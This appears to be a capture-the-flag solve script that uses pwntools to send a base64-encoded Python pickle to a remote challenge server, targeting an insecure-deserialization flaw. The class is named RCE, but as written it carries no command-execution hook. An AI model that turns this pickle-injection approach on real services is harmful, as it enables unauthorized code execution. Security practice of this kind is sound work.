import pickle
import base64
import os
from pwn import remote, log

r = remote("io.ept.gg", 30081)

class RCE:
    def name():
        return "Rick"

pickled = pickle.dumps(RCE())
payload = base64.urlsafe_b64encode(pickled)

log.info(f"{payload=}")

r.recvuntil(b"pickle")
r.sendline(payload)

r.interactive()


